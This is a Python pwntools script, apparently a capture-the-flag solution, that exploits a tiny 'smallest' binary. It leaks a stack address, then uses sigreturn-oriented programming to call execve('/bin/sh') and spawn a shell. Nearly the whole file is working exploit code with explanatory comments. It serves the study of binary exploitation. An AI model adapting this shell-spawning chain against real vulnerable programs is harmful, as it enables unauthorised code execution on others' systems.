from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./smallest')
elf = ELF('./smallest')

read = 0x4000b0
syscall_ret = 0x4000be

payload1 = p64(read) * 0x3

p.send(payload1)

'''
read again
set return address to 0x4000b8 and rax = 1
-> write 400 byte on the stack -> leak stack address
'''
p.send(b'\xb8')
leaked_stack_addr = u64(p.recv()[8:16])


sigframe_read = SigreturnFrame()
sigframe_read.rax = constants.SYS_read
sigframe_read.rdi = 0x0
sigframe_read.rsi = leaked_stack_addr
sigframe_read.rdx = 0x400
sigframe_read.rsp = leaked_stack_addr
sigframe_read.rip = syscall_ret

'''
read again
set return address to 0x4000b0 and sigframe_read(for read bytes on leaked_stack_addr)
b'a' * 0x8 is used for preserving space for a return address(we will explain below)
'''
payload2 = p64(read) + b'a' * 0x8 + bytes(sigframe_read)
p.send(payload2)

'''
set return address to 0x4000be and rax = 0xf
-> syscall -> sigreturn -> set rsp to leaked_stack_addr successfully
'''
sigreturn = p64(syscall_ret) + b'b' * 0x7;
p.send(sigreturn)


sigframe_execve = SigreturnFrame()
sigframe_execve.rax = constants.SYS_execve
sigframe_execve.rdi = leaked_stack_addr + 0x200
sigframe_execve.rsi = 0x0
sigframe_execve.rdx = 0x0
sigframe_execve.rsp = leaked_stack_addr
sigframe_execve.rip = syscall_ret

'''
read again
read 0x400 bytes to leaked_stack_addr
p64(0x4000b0) + b'a' * 0x8 + sigframe_execve(for execve /bin/sh) + padding + /bin/sh
'''
execve_frame_payload = p64(read) + b'a' * 0x8 + bytes(sigframe_execve)
payload3 = execve_frame_payload + b'\x00' * (0x200 - len(execve_frame_payload)) + b'/bin/sh\x00'
p.send(payload3)

'''
trigger sigreturn
-> get shell
'''
p.send(sigreturn)

p.interactive()
